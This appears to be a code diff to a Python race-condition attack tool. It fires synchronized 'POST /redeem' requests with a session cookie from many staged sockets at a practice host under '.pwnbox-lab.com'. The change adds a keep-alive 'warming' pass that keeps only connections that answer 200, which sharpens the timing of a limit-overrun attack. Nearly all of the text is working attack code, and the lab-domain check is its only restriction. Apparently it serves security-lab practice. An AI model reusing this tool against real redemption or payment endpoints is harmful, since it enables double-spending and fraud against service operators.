@@ -2,6 +2,7 @@
 """Timed authorized-lab requests issued from one persistent egress source."""
 import concurrent.futures as cf
 import json
+import http.client
 import os
 import socket
 import ssl
@@ -30,6 +31,7 @@ def run_task(task,offset):
     cookie=task["cookie"]
     count=int(task["count"])
     tag=task["tag"]
+    warm=bool(task.get("warm",False))
     release=float(task["release_at"])+float(task.get("offset_ms",0))/1000
     if not host.endswith(".pwnbox-lab.com") or count<1 or count>300:
         return {"worker":ID,"tag":tag,"error":"invalid task"}
@@ -49,6 +51,31 @@ def run_task(task,offset):
     errors={}
     for i,s,t,e in staged:
         if e: errors[e]=errors.get(e,0)+1
+    warm_counts={}
+    if warm:
+        def warm_one(item):
+            i,s,t=item
+            try:
+                request=(f"GET /?cw={tag}-{i} HTTP/1.1\r\nHost: {host}\r\n"
+                         "Connection: keep-alive\r\n\r\n").encode()
+                s.sendall(request)
+                s.settimeout(15)
+                response=http.client.HTTPResponse(s)
+                response.begin()
+                status=response.status
+                response.read()
+                return status
+            except Exception:
+                return 0
+        with cf.ThreadPoolExecutor(max_workers=max(1,count)) as pool:
+            warm_statuses=list(pool.map(warm_one,live))
+        for status in warm_statuses:
+            key=str(status) if status else "error"
+            warm_counts[key]=warm_counts.get(key,0)+1
+        old_live=live
+        live=[item for item,status in zip(old_live,warm_statuses) if status==200]
+        for item,status in zip(old_live,warm_statuses):
+            if status!=200:item[1].close()
     request=(f"POST /redeem HTTP/1.1\r\nHost: {host}\r\n"
              "User-Agent: authorized-lab-pair-probe/1\r\n"
              f"Cookie: session={cookie}\r\nContent-Length: 0\r\n"
@@ -87,6 +114,7 @@ def run_task(task,offset):
                                    "median_ms":round(statistics.median(selected),1),
                                    "max_ms":max(selected)}
     return {"worker":ID,"tag":tag,"count":count,"offset_ms":task.get("offset_ms",0),
+            "warm":warm,"warm_counts":warm_counts,
             "start_error_ms":round((start-release)*1000,2),
             "shared_time_offset_ms":round((start-float(task["release_at"]))*1000,2),
             "send_span_ms":span,"staged":len(live),"send_ok":sum(x[3] for x in sends),
